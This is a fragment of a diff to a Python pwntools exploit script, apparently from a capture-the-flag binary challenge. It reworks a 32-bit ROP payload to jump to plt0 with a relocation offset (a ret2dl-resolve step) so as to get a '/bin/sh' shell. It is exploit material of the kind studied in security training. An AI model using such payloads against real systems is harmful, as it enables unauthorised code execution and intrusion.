@@ -27,9 +27,12 @@ payload += p32(leaveRet)
 io.sendline(payload)
 
 cmd = "/bin/sh\0"
+plt0 = 0x8048370
+idxOff = 0x20
 
 payload = "aaaa"
-payload += p32(writePlt)
+payload += p32(plt0)
+payload += p32(idxOff)
 payload += "aaaa"
 payload += p32(1)
 payload += p32(elf.bss() + 0x800 + 0x80)
